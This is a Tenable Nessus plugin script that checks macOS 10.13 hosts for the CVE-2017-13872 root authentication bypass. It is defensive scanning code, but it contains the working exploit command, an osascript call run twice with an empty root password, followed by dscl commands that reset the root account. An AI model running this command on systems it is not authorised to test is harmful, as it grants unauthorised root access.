#TRUSTED 98570eaae38d3935a510f2647ab18cc77f986b62b0e19ed7b01827394e6079e0489820a5c4f7417ac0d15d33fd50f7221723081d9347266961c51e817e01769f07a30ebe7823f7cceff3681b731f96496b3191eb349d06ddc4dfd585e793f9276ede14cf8f2e02511579576c89d2b735361193f48ed5b6b69c77abe3fa95db936b73180535c1610051fc8d6e0d4dfc8aea571820202b1b4a243d61e81cc4e95a8f231a9ed4acc324adf5a20d0557f4606140811402dbb8d9ef6a51dc5f009ce23f1c38e6a59571a2bf54f184f05c8e473a7b0e637581e17fb249d3466ae34b8e27203ca992ea779eb77ceab9fa325e7b562c6b688c7ed0751fbf489e238ef30d8b370de677ecb11cb31d4a52203a3f0dcab1140d72564d88eba1caf2857ce6c83ed6b6f6457b73f9b9296759c4f84c9175616055add12284085ae1ad3980e644c9693d4aa704e4d11236b7dfd23a4939092ae0c298951d6049dc1caf8850ed920277e04f2f3ed70354c3a9ab05d81277f5dd78093c9e2fc1be5c83ff2e6457b76c4fb5f2fd749569e0b781be424b60b56d5c3c661eb16000ea284b7b545bdc4ca025af1e18a4eeb77c3427a35dafc60487804c61dd97bf8e92f004377a46d126246a863145a468912f9640d79ca7449b7d1764776644e6551226b1e89dc446baf5f4530792c28e7b648a05c35d9c00011672a859da1ea04166496ce3a21082e0
#TRUST-RSA-SHA256 171da2ffc2d86c5c468bc034e5dd816505785a358c1e475c77601d27b9e3eeb3b7b7dde219410c86b25ab71c8c1d81102d998084b914b76ad8cf5d45782811f03756f5aee215992cf556e1492a7ca10525c117c45f6aee18785d6f9ec621335f0f435cd409d45870a1f65548271364de4c2703eef2fcebbcba992d871676b19632a801d1435976a7d66c806c681ab706424b66a4cd1bc8fe02f03c0633b8194d49d06d3f69a00a3e8dc4ed7791016492b109b9bcc244739524a6ebc83f0e10b5c1267fcf13b6051b8433021f584667f047c7b9f01109e8ca15258fed5078efd222bd9dff33ed6be664be36d2eb642281d8595bbc44c6ff3d3994642352fc0a3d7802eb9e47fac0612fe0f35653ac39e556f91dd0315c5094be5441aba408d02effe6e5fac9961148e9c11eef75842fbfdc3ffff9d46fd24c7dc22b310ba7d02ee91768eeb7c80e61d452e1518d3b4a3b93bcf1d9804db13e0bd631d553c08ca51cc852aca810c7f172d552a0ece09a4d8c606a88fcdfa969d8ef50446fa5570799e57b00cb59c7eddc400d0a59e16a73fe71a8af6e057b976cc64a2b19c05613f5d06bd8da705fe9b1bfdf57b851270f85a7412729bd783f73b6409e56aa2dd6cd3c22cea2babaf741877a39d74f60730ddd75625694f50f5c96b9e52bd8d83b28a33518599807343f74e23863dcf15afb3e25ce5cfcbbd4dd68014bf53d9242
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(104848);
  script_version("1.13");
  script_set_attribute(attribute:"plugin_modification_date", value:"2025/02/18");

  script_cve_id("CVE-2017-13872");
  script_bugtraq_id(101981);

  script_name(english:"macOS 10.13 root Authentication Bypass Direct Check");
  script_summary(english:"Checks if the root password can be blanked out.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running a version of macOS that is affected by a
root authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of macOS that has a root
authentication bypass vulnerability. A local attacker or a remote
attacker with credentials for a standard user account has the ability
to blank out the root account password. This can allow an attacker to
escalate privileges to root and execute commands and read files as a
system administrator.");
  script_set_attribute(attribute:"see_also", value:"https://support.apple.com/en-us/HT208315");
  # https://objective-see.com/blog/blog_0x24.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2cf4b55a");
  # https://twitter.com/lemiorhan/status/935578694541770752
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9ff9ff45");
  # https://www.theregister.co.uk/2017/11/28/root_access_bypass_macos_high_sierra/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1e5890f3");
  # https://www.theverge.com/2017/11/28/16711782/apple-macos-high-sierra-critical-password-security-flaw
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f367aab4");
  # https://support.apple.com/en-us/HT204012
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f9f9bbc3");
  script_set_attribute(attribute:"solution", value:
"Enable the root account and set a strong root account password.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-13872");
  script_set_attribute(attribute: "cvss3_score_source", value: "manual");
  script_set_attribute(attribute:"cvss3_score_rationale", value:"Scoring adjustsed to align with CVSS 3.1 attack complexity guidance.");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Mac OS X Root Privilege Escalation');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/11/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/11/29");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:apple:mac_os_x");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:apple:macos");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"MacOS X Local Security Checks");

  script_copyright(english:"This script is Copyright (C) 2017-2025 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_get_info.nasl");
  script_require_keys("Host/local_checks_enabled", "Host/MacOSX/Version");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ssh_func.inc");
include("macosx_func.inc");

enable_ssh_wrappers();

if (!get_kb_item("Host/local_checks_enabled")) audit(AUDIT_LOCAL_CHECKS_NOT_ENABLED);

os = get_kb_item("Host/MacOSX/Version");
if (!os) audit(AUDIT_OS_NOT, "macOS");
if (os !~ "Mac OS X 10\.13([^0-9]|$)") audit(AUDIT_OS_NOT, "macOS 10.13");

# check we're not root first
results = exec_cmd(cmd:"id");
if ("uid=0(root)" >< results)
  audit(AUDIT_HOST_NOT, "affected");

id_cmd = '/usr/bin/osascript -e \'do shell script "id" user name "root" password "" with administrator privileges\'';
results = exec_cmd(cmd:id_cmd);
# if we're vuln, the first time blanks the password, second time runs id
results = exec_cmd(cmd:id_cmd);

if ("uid=0(root)" >!< results)
{
  # not vuln
  audit(AUDIT_HOST_NOT, "vulnerable either because a root password is set or the vulnerability has been patched");
}

# if we are vulnerable we need to do some cleanup to
# set the system state back to pre-exploit
# this disables the root account and resets
# the password back to not blank
cmd = '/usr/bin/osascript -e \'do shell script "dscl . -create /Users/root passwd \'\\*\'" user name "root" password "" with administrator privileges\'';
exec_cmd(cmd:cmd);
cmd = '/usr/bin/osascript -e \'do shell script "dscl . -delete /Users/root authentication_authority" user name "root" password "" with administrator privileges\'';
exec_cmd(cmd:cmd);
cmd = '/usr/bin/osascript -e \'do shell script "dscl . -delete /Users/root ShadowHashData" user name "root" password "" with administrator privileges\'';
exec_cmd(cmd:cmd);

report = '  Nessus was able to execute commands as root by\n' +
         '  first blanking the root account password and then\n' +
         '  running "id" by using this command twice:\n' +
         '\n' +
         '  ' + id_cmd + '\n' +
         '\n' +
         '  which produced the following output:\n' +
         '\n' +
         '  ' + results + '\n';

security_report_v4(port:0, severity:SECURITY_HOLE, extra:report);
